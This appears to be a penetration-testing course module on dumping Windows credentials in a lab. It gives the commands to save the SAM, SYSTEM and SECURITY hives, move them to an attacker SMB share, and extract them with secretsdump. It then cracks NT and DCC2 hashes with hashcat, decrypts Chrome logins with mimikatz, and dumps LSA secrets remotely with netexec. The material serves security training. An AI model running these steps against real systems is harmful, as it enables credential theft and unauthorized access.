With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline.
## Registry hives

There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes.

|Registry Hive|Description|
|---|---|
|`HKLM\SAM`|Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.|
|`HKLM\SYSTEM`|Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.|
|`HKLM\SECURITY`|Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.|
#### Using reg.exe to copy registry hives

By launching `cmd.exe` with administrative privileges, we can use `reg.exe` to save copies of the registry hives. Run the following commands:

	C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

	C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

	C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

If we're only interested in dumping the hashes of local users, we need only `HKLM\SAM` and `HKLM\SYSTEM`.

It's often useful to save `HKLM\SECURITY` as well, since it can contain cached domain user credentials on domain-joined systems, along with other valuable data.

nce these hives are saved offline, we can use various methods to transfer them to our attack host. In this case, we'll use Impacket's [smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) in combination with some basic CMD commands to move the hive copies to a share hosted on our attacker machine.

#### Creating a share with smbserver

To create the share, we simply run `smbserver.py -smb2support`, specify a name for the share (e.g., `CompData`), and point to the local directory on our attack host where the hive copies will be stored (e.g., `/home/ltnbob/Documents`).

The `-smb2support` flag ensures compatibility with newer versions of SMB. If we do not include this flag, newer Windows systems may fail to connect to the share, as SMBv1 is disabled by default due to [numerous severe vulnerabilities](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1) and publicly available exploits.

	AstraX01@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Once the share is running on our attack host, we can use the `move` command on the Windows target to transfer the hive copies to the share.

#### Moving hive copies to share

	C:\> move sam.save \\10.10.15.16\CompData
	    1 file(s) moved.

	C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

	C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.


We can then confirm that our hive copies were successfully moved to the share by navigating to the shared directory on our attack host and using `ls` to list the files.

---
## Dumping hashes with secretsdump

One particularly useful tool for dumping hashes offline is Impacket's `secretsdump`. 

Impacket is included in most modern penetration testing distributions. To check if it is installed on a Linux based system, we can use the `locate` command:

	AstraX01@htb[/htb]$ locate secretsdump

Using `secretsdump` is straightforward. We simply run the script with Python and specify each of the hive files we retrieved from the target host.

	AstraX01@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Notice that the first step `secretsdump` performs is retrieving the `system bootkey` before proceeding to dump the `local SAM hashes`.

This is necessary because the bootkey is used to encrypt and decrypt the SAM database.
The first step `secretsdump` performs is retrieving the `system bootkey` before proceeding to dump the `local SAM hashes`.

Most modern Windows operating systems store passwords as `NT hashes`. Older systems (such as those prior to Windows Vista and Windows Server 2008) may store passwords as `LM hashes`, which are weaker and easier to crack. Therefore, LM hashes are useful if the target is running an older version of Windows.

## Cracking hashes with Hashcat

 Once we have the hashes , we can begin cracking them using [Hashcat](https://hashcat.net/hashcat/). Hashcat supports a wide range of hashing algorithms, as outlined on its website

As mentioned earlier, we can populate a text file with the NT hashes we were able to dump.

	AstraX01@htb[/htb]$ sudo vim hashestocrack.txt

Now that the NT hashes are in our text file (`hashestocrack.txt`), we can use Hashcat to crack them.

#### Running Hashcat against NT hashes

Hashcat supports many different modes, and selecting the right one depends largely on the type of attack and the specific hash type we want to crack.

 Covering all available modes is beyond the scope of this module, so we will focus on using the `-m` option to specify hash type `1000`, which corresponds to NT hashes (also known as NTLM-based hashes).

	AstraX01@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

 Understanding and applying this technique can be valuable during assessments. We will benefit from it anytime we encounter a vulnerable Windows system and gain administrative rights to dump the SAM database.

Keep in mind that this is a well-known technique, and administrators may have implemented safeguards to detect or prevent it. Several detection and mitigation strategies are [documented](https://attack.mitre.org/techniques/T1003/002/) within the MITRE ATT&CK framework.

## DCC2 hashes

A DCC2 hash (Domain Cached Credentials version 2, also called MS-Cache v2) is a local Windows password hash for domain accounts. Windows stores these hashes so users can sign in when a domain controller is offline. It uses the account username as a salt with PBKDF2-HMAC-SHA1.

As mentioned previously, `hklm\security` contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed copies of network credential hashes.

	inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25

This type of hash is much more difficult to crack than an NT hash, as it uses PBKDF2. Additionally, it cannot be used for lateral movement with techniques like Pass-the-Hash (which we will cover later). 

**The Hashcat mode for cracking DCC2 hashes is `2100`.**

	AstraX01@htb[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt

## DPAPI

we previously saw that the `machine and user keys` for `DPAPI` were also dumped from `hklm\security`.

The Data Protection Application Programming Interface, or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection), is a set of APIs in Windows operating systems used to encrypt and decrypt data blobs on a per-user basis.

DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).

	C:\Users\Public> mimikatz.exe
	mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
## Remote dumping & LSA secrets considerations

With access to credentials that have `local administrator privileges`, it is also possible to target LSA secrets over the network. This may allow us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.

#### Dumping LSA secrets remotely

	AstraX01@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa 

#### Dumping SAM Remotely

Similarly, we can use netexec to dump hashes from the SAM database remotely. 

	AstraX01@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam




